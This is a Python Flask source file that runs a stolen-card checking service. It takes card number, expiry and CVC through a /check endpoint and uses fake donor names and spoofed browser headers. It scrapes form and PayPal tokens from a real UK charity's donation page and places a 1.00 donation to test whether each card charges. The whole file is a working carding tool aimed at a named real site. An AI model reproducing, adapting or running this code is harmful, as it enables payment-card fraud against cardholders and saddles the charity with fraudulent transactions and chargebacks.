import requests, re, base64, json, random, os
from flask import Flask, request, jsonify
from user_agent import generate_user_agent

app = Flask(__name__)

def look(cc_line):
    try:
        # Parsing format: 1234567812345678|12|2026|123
        parts = [x.strip() for x in cc_line.split("|")]
        if len(parts) != 4:
            return "INVALID_FORMAT"
        
        number, month, year, cvc = parts
        month = month.zfill(2)
        year = year[2:] if len(year) == 4 else year
    except Exception:
        return "INVALID_FORMAT"

    # Data Palsu untuk Form
    first = random.choice(["James", "Emma", "Michael", "Sophia", "William"])
    last  = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first.lower()}{random.randint(111,999)}@gmail.com"
    
    s = requests.Session()
    user = generate_user_agent()
    
    # Header untuk meniru browser asli
    headers = {
        'User-Agent': user,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Origin': 'https://stockportmecfs.co.uk',
        'Referer': 'https://stockportmecfs.co.uk/donate-now/'
    }

    try:
        # Langkah 1: Ambil Token dan Form Data
        init_resp = s.get("https://stockportmecfs.co.uk/donate-now/", headers=headers, timeout=15)
        if init_resp.status_code != 200:
            return "SITE_BLOCKED_OR_DOWN"

        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', init_resp.text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', init_resp.text).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', init_resp.text).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', init_resp.text).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8')).group(1)
        
        # Langkah 2: Buat Order (Cek JSON secara aman)
        payload_create = {
            'give-form-id-prefix': form_prefix, 'give-form-id': form_id, 'give-form-hash': form_hash,
            'give-amount': "1.00", 'payment-mode': 'paypal-commerce', 'give_first': first,
            'give_last': last, 'give_email': email, 'give-gateway': 'paypal-commerce'
        }
        
        create_url = "https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        resp_create = s.post(create_url, data=payload_create, headers=headers, timeout=15)
        
        if not resp_create.text or resp_create.status_code != 200:
            return "FAILED_TO_CREATE_ORDER"

        order_data = resp_create.json()
        order_id = order_data.get('data', {}).get('id')
        if not order_id:
            return "ORDER_ID_NOT_FOUND"

        # Langkah 3: Konfirmasi Pembayaran via PayPal API
        payload_confirm = {
            "payment_source": {"card": {"number": number, "expiry": f"20{year}-{month}", "security_code": cvc}}
        }
        
        pay_headers = {
            'Authorization': f"Bearer {access_token}",
            'Content-Type': 'application/json',
            'User-Agent': user
        }
        
        confirm_url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
        s.post(confirm_url, json=payload_confirm, headers=pay_headers, timeout=15)
        
        # Langkah 4: Final Approval
        approve_url = f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}"
        resp_approve = s.post(approve_url, data=payload_create, headers=headers, timeout=15)
        
        res_text = resp_approve.text.lower()
        if any(x in res_text for x in ['thank', 'thanks', 'true']): return "CHARGED"
        if 'insufficient_funds' in res_text: return "INSUFFICIENT_FUNDS"
        if 'card_error' in res_text or 'declined' in res_text: return "DECLINED"
        
        return "ORDER_FAILED"

    except Exception as e:
        return f"ERROR: {str(e)}"

@app.route('/')
def home():
    return jsonify({"status": "Online", "endpoint": "/check?card=cc|mm|yy|cvv"})

@app.route('/check')
def check_card():
    card_data = request.args.get('card')
    if not card_data:
        return jsonify({"error": "No card data provided"}), 400
    
    result = look(card_data)
    return jsonify({"card": card_data, "result": result})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
